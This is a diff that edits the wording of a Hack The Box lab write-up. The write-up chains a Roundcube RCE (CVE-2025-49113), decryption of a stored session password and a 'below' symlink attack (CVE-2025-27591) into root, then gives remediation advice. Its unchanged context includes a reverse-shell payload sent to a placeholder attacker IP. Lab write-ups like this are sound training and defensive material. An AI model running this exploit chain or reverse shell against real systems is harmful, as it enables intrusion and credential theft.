@@ -38,7 +38,7 @@ outcome: "Code execution as the Roundcube service account, SSH access as the loc
 
 ## From Roundcube RCE to below symlink root
 
-Outbound is a Hack The Box Linux lab that chains an authenticated Roundcube remote code execution flaw (CVE-2025-49113) into full root access. The webmail configuration exposes the application database and its `des_key`, so a session-stored password can be decrypted; the recovered webmail account discloses a system password that authenticates over SSH, and the `below` logging utility is abused through a symlink attack (CVE-2025-27591) to modify `/etc/passwd` and gain root. Target identifiers, credentials, and secret values are replaced with role-based placeholders; command syntax is preserved. See [how evidence is handled](/method/).
+Outbound is a Hack The Box Linux lab that chains an authenticated Roundcube remote code execution flaw (CVE-2025-49113) into full root access. The webmail configuration exposes the application database and its `des_key`, so a session-stored password can be decrypted; the recovered webmail account discloses a system password that authenticates over SSH, and a symlink attack on the `below` logging utility (CVE-2025-27591) modifies `/etc/passwd` to gain root. This writeup replaces target identifiers, credentials, and secret values with role-based placeholders and preserves command syntax. See [how evidence is handled](/method/).
 
 **Attack path:** **authenticated Roundcube RCE (CVE-2025-49113) → `www-data` shell → `config.inc.php` database credential recovery → DES session password decryption → mailbox credential disclosure → SSH as `<SYSTEM_ACCOUNT>` → `below` symlink attack (CVE-2025-27591) → root**
 
@@ -48,7 +48,7 @@ Outbound is a Hack The Box Linux lab that chains an authenticated Roundcube remo
 - **Application:** Roundcube webmail served from `/var/www/html/roundcube` and backed by a local MySQL database.
 - **Starting position:** provided low-privileged `<WEBMAIL_ACCOUNT>` webmail credentials.
 - **Objective:** move from the provided webmail account to root, and demonstrate the impact of an unpatched webmail flaw, application secrets reachable by the web user, and an unsafe privileged utility.
-- **Constraints:** activity was confined to the Hack The Box lab environment, and the `mail.<DOMAIN>` virtual host was resolved locally for the web requests.
+- **Constraints:** activity was confined to the Hack The Box lab environment, and the web requests required resolving `mail.<DOMAIN>` locally.
 
 ## Evidence: Roundcube RCE to below symlink attack
 
@@ -70,7 +70,7 @@ Significance: port 80 advertises no application directly but redirects to a name
 
 Result: SSH and an nginx service fronting a virtual-hosted webmail application are identified.
 
-### 2. CVE-2025-49113 — Authenticated Roundcube RCE
+### 2. CVE-2025-49113: Authenticated Roundcube RCE
 
 Observation: the application is a Roundcube webmail instance, and provided credentials are available for the `<WEBMAIL_ACCOUNT>` account. Roundcube before 1.5.10 and 1.6.x before 1.6.11 is affected by CVE-2025-49113, an authenticated PHP object deserialization flaw in `program/actions/settings/upload.php`.
 
@@ -84,7 +84,7 @@ penelope -p <LISTENER_PORT>
 php CVE-2025-49113.php http://mail.<DOMAIN>/ '<WEBMAIL_ACCOUNT>' '<WEBMAIL_ACCOUNT_PASSWORD>' 'bash -c "sh -i >& /dev/tcp/<ATTACKER_IP>/<LISTENER_PORT> 0>&1"'
 ```
 
-The source records a reverse shell as the `www-data` service account; no terminal output for this step was retained.
+The source records a reverse shell as the `www-data` service account, but no terminal output for this step was retained; the shell is reconstructed from the notes.
 
 Significance: the flaw executes in the Roundcube service context, which holds the application configuration and the database credentials it references.
 
@@ -127,7 +127,7 @@ Result: an encrypted session password for `<SYSTEM_ACCOUNT>` is recovered.
 
 ### 4. DES Session Password Decryption
 
-Observation: the Roundcube configuration also contains the `des_key` used to encrypt the passwords stored in session data.
+Observation: the configuration file also contains the `des_key` used to encrypt the passwords stored in session data.
 
 ```php
 $config['des_key'] = '<DES_KEY>';
@@ -143,7 +143,7 @@ python3 rcube-decrypt.py
 Decrypted password (utf-8): <ROUNDCUBE_PASSWORD>
 ```
 
-Significance: the key that protects the stored password sits beside the ciphertext in the same readable configuration, so the session value is reversible rather than protected.
+Significance: the key that protects the stored password sits beside the ciphertext in the same readable configuration, so the stored password is reversible from the same readable file.
 
 Result: `<SYSTEM_ACCOUNT>`'s Roundcube password is recovered and subsequently validated through the webmail application.
 
@@ -177,9 +177,9 @@ Significance: the mailbox message converts a webmail-only secret into a system c
 
 Result: an authenticated SSH shell is obtained as `<SYSTEM_ACCOUNT>`.
 
-### 6. CVE-2025-27591 — below Symlink Privilege Escalation
+### 6. CVE-2025-27591: below Symlink Privilege Escalation
 
-Observation: the sudo policy lets `<SYSTEM_ACCOUNT>` run `/usr/bin/below` as root, and `below` before 0.9.0 writes its logs under a directory writable by the low-privileged user, enabling a symlink attack (CVE-2025-27591).
+Observation: I checked the sudo policy: `<SYSTEM_ACCOUNT>` can run `/usr/bin/below` as root, and `below` before 0.9.0 writes its logs under a directory writable by the low-privileged user, which enables a symlink attack (CVE-2025-27591).
 
 ```bash
 sudo -l
@@ -226,12 +226,12 @@ The evidence establishes root command execution on the host. Access rested on an
 
 ## Recommendations: Roundcube, plaintext config, session secrets, and below
 
-Each finding pairs the observed root cause with its demonstrated impact and a prioritized action. The actions are recommendations; none was validated in the lab.
+The actions are recommendations; none was validated in the lab.
 
 1. **Unpatched Roundcube (CVE-2025-49113).** An authenticated user could reach code execution through the upload action's unvalidated `_from` parameter. *Recommendation:* upgrade to a fixed release (1.5.10 or 1.6.11) and restrict access to the webmail application. *Detection:* monitor for object-deserialization patterns and unexpected `_from` values in requests to `program/actions/settings/upload.php`.
 2. **Plaintext database credentials in application configuration.** The MySQL password was stored in `config.inc.php`, readable by the web application user. *Recommendation:* store configuration outside the web root under restrictive ownership and permissions, and scope database accounts to least privilege. *Detection:* scan configuration files and backups for embedded secrets.
 3. **Reversible passwords in session data.** The `session` table held passwords encrypted with the application `des_key`, and both the ciphertext and the key were reachable from the web user's context. *Recommendation:* avoid storing reversible credentials in session state, rotate the `des_key`, and keep key material separate from the data it protects. *Detection:* audit the `session` table for credential-bearing fields.
-4. **Symlink attack in a privileged logging utility (CVE-2025-27591).** `below` created a user-writable log location and followed a symlink when writing as root, permitting modification of `/etc/passwd`. *Recommendation:* upgrade `below` to 0.9.0 or later, keep its log directory root-owned and non-writable, and narrow the sudo policy that allows it. *Detection:* monitor symlink creation in logging directories and unexpected writes to `/etc/passwd`.
+4. **Symlink attack in a privileged logging utility (CVE-2025-27591).** `below` created a user-writable log location and followed a symlink when writing as root, which allowed modification of `/etc/passwd`. *Recommendation:* upgrade `below` to 0.9.0 or later, keep its log directory root-owned and non-writable, and narrow the sudo policy that allows it. *Detection:* monitor symlink creation in logging directories and unexpected writes to `/etc/passwd`.
 
 ## References
 
